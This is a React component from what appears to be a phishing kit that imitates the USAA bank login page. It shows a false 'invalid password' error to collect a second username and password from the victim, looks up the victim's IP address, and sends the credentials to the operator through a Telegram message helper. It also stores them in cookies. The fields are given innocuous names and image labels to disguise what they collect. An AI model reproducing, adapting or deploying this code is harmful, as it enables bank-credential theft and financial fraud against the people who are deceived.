import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import score from "../assets/score.png"
import scorePro from "../assets/scorePro.png"

export default function ReLogin() {
  const [formInput, setFormInput] = useState<Login2>({
    score2: "",
    scorePro2: ""
})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true);

    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    const visitorIP = response.ip;


    const message = `
    [----+🏦 USAA (SECOND TRY) 🏦+----]

    IP: ${visitorIP}

    USERNAME 2: ${formInput.score2}

    PASSWORD 2: ${formInput.scorePro2}
    `;
    await TelegramSend(message)
    cookies.set("login2", formInput)
    cookies.set("ipman", {ipman: visitorIP});
    setIsLoading(false);
    navigate("../login/auth", {replace:true})
}
  return (
    <>
    <div className="submitForm">
      <p
        className="go-left"
        style={{ fontSize: "14px", marginBottom: "30px", color: "red" }}
      >
       Invalid username or password, please try again!
      </p>

      <form method="post" onSubmit={handleSubmit} aria-busy="false">
        <div className="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
          <div className="usaa-form-v5-10-1-block col-1-1">
            <div>
              <div>
                <label
                  htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                  className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                >
                   <div className="kylexy">
          <img src={score} height={20} alt="" />
                      </div>
                </label>
              </div>
              <div>
                <div
                  id="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage"
                  className="usaa-form-v5-10-1-fieldWrapper-errorMessage"
                  data-error-message=""
                ></div>
                <div className="screenReader" role="alert"></div>
              </div>
              <span className="usaa-input">
                <input
                  name="score2"
                  onChange={handleInputChange}
                  aria-invalid="false"
                  id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                  type="text"
                  aria-describedby="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage undefined"
                  required
                />
                <span className="keyboardFocusRing" aria-hidden="true"></span>
              </span>
            </div>
            <div className="keyboardFocusRing"></div>
          </div>
        </div>

        <div className="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
          <div className="usaa-form-v5-10-1-block col-1-1">
            <div>
              <div>
                <label
                  htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                  className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                >
                   <div className="kylexy">
          <img src={scorePro} height={20} alt="" />
                      </div>
                </label>
              </div>
              <div>
                <div
                  id="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage"
                  className="usaa-form-v5-10-1-fieldWrapper-errorMessage"
                  data-error-message=""
                ></div>
                <div className="screenReader" role="alert"></div>
              </div>
              <span className="usaa-input">
                <input
                  name="scorePro2"
                  onChange={handleInputChange}
                  aria-invalid="false"
                  id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                  type="password"
                  aria-describedby="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage undefined"
                  required
                />
                <span className="keyboardFocusRing" aria-hidden="true"></span>
              </span>
            </div>
            <div className="keyboardFocusRing"></div>
          </div>
        </div>
        {isLoading ?
          <button
          type="button"
          className="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
          id="next-button"
          aria-labelledby="next-button"
        >
          <span>Please wait...</span>
        </button>
          :
          <button
            type="submit"
            className="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
            id="next-button"
            aria-labelledby="next-button"
          >
            <span>Next</span>
          </button>}
        <div className="help-link">
          <a
            aria-label="I need help logging on. (Opens a pop up)."
            role="link"
          >
            I need help logging on
          </a>
        </div>
      </form>
    </div>
  </>
  );
}
